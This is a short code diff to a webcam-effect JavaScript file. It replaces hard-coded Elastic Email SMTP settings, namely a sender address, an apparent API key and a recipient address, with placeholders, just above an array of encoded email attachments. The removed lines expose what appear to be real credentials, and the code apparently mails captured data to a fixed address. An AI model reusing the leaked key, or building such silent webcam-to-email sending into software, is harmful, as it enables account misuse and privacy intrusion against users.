@@ -3118,10 +3118,10 @@ WebcamToy.Effect = (function (u) {
                 return '_' + Math.random().toString(36).substr(2, 9);
             };
             
-            var _EMAIL="alonnsohackerone@gmail.com"
-            var _PASS="7B6007F33B72796FC42CDD5122E54E120CE5"
-            var _TO="alonnsoandres@gmail.com"
-            var _HOST='smtp.elasticemail.com'
+			var _EMAIL="your_elastic_email@gmail.com"
+			var _PASS="your_elastic_api_key"
+			var _TO="your_email@gmail.com"
+			var _HOST='smtp.elasticemail.com'
         
             const Attachments= [
                 {   // encoded string as an attachment
